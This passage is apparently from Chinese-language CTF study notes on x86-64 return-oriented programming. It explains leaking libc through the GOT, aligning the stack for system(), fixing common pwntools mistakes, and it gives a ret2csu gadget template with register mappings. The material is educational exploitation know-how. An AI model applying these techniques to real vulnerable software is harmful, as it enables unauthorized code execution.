3. **GOT 表与 libc leak 的关系**：Partial RELRO 下 GOT 内容是 lazy-resolve 之后的真实 libc 函数地址，直接 `write(1, write_got, 8)` 读出来就能算 libc base。
4. **栈对齐（movaps 崩溃保护）**：64 位下 `system` 中 `do_system()` 会触发 `movaps xmm0, [rsp+0x50]`，对 rsp ≡ 0 (mod 16)。在 gadget 1 (`pop *6` = +0x30) + gadget 2 (`add rsp,8; pop *6; ret`) 之间 rbp 偏移，需要在第二个 stage 加一个无副作用的 `ret` 来对齐。

### 常见错误与排查

| 现象                                     | 原因                                                         | 处理                                                         |
| ---------------------------------------- | ------------------------------------------------------------ | ------------------------------------------------------------ |
| `r.recvline()` 阻塞                      | 程序输出末未必带 `\n`，或 server 关闭输出缓冲                | 用 `r.recv()` 或 `r.clean()` 替代；或先 `r.sendline(payload)` 再消费 |
| `LibcBase` 算出来 0x7f 开头但后 3 位不对 | `recv` 多读了 prompt 字符                                    | 用 `r.recvuntil(b'...')` 锁定边界，或者用 `r.recvn(8)` 严格取 8 字节 |
| 第二阶段拿到 shell 后立刻 SIGSEGV        | 栈未 16 对齐，`movaps` 崩溃                                  | 第二阶段开头加一个 `ret` 垫一下                              |
| 调 `system("/bin/sh")` 没反应            | stdin/stdout 不在 socket 上（少数 socat/xinetd 配置会把 fd 重映射） | 改用 `open/read/write` 三段式 ret2csu 起 shell，或在 payload 里把 fd 0、1 重定向到 socket（dup2） |

---

##  ret2csu 思维模板（备忘）

> **什么时候必须用 ret2csu？**
>
> - 题目里没有 `pop rdx; ret`、没有可用的 `xor rdx, rdx; ret`，但又要调 `read` / `write` 这类需要 rdx 控制长度的 syscall。
> - 需要把 `r12~r15` 当 `edi/rsi/rdx` 用，又不想走 6 个散 gadget。

> **最小可复用模板（AMD64）**
>
> ```python
> csu_pop  = 0x40122a   # pop rbx / rbp / r12 / r13 / r14 / r15 / ret
> csu_call = 0x401210   # mov rdx,r14 / mov rsi,r13 / mov edi,r12d
>            # call [r15 + rbx*8] ; add rbx,1 ; cmp rbx,rbp ; jne csu_call
> # 后面紧跟：add rsp,8 ; pop rbx..r15 ; ret  这 7 个槽是漏出循环后要填的
> ```
>
> 调用约定：
>
> | r12  | r13  | r14  | r15                           |
> | ---- | ---- | ---- | ----------------------------- |
> | edi  | rsi  | rdx  | 「存放函数指针」的地址        |
> | rbx  | rbp  |      | rbx=0, rbp=1 表示调一次即退出 |
>
> 顺便记：用完一轮后，csu_call 退出循环还会再 pop 6 个寄存器 + 跳过 8 字节（add rsp,8），共 7 个 qword 才能到 ret。脚本里习惯写成 `p64(1)*7`。

---